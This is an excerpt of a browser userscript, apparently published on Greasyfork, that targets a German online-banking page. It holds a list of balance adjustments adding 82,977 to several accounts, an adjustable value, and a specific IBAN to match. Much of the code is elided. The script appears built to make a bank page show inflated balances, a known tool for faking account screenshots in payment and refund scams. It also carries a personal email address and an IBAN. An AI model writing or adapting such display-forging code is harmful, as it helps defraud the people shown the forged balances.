// ==UserScript==
// @name         Ed Start 4Rec db.laty142410@web.de
...
// @downloadURL https://update.greasyfork.org/scripts/542275/Ed%20Start%204Rec%20dblaty142410%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/542275/Ed%20Start%204Rec%20dblaty142410%40webde.meta.js
// ==/UserScript==
...
//         UBERSICHT
    ...
    const accountBalanceAdjustments = [
        ...
        { index: 1, amount: 0 },
         ...
         { index: 2, amount: 82977},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
       { index: 4, amount: 82977 },  // 5
         { index: 5, amount: 82977 }, //1
         { index: 6, amount:  0},
        { index: 7, amount: 82977 }, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },
...
//     UMSATZE BALANCE
    ...
    var adjustValue = 82977.00; // Modify this value as needed

    // Specify the IBAN value to check for
    var ibanCheck = "DE03 2657 0024 0152 1970 00";
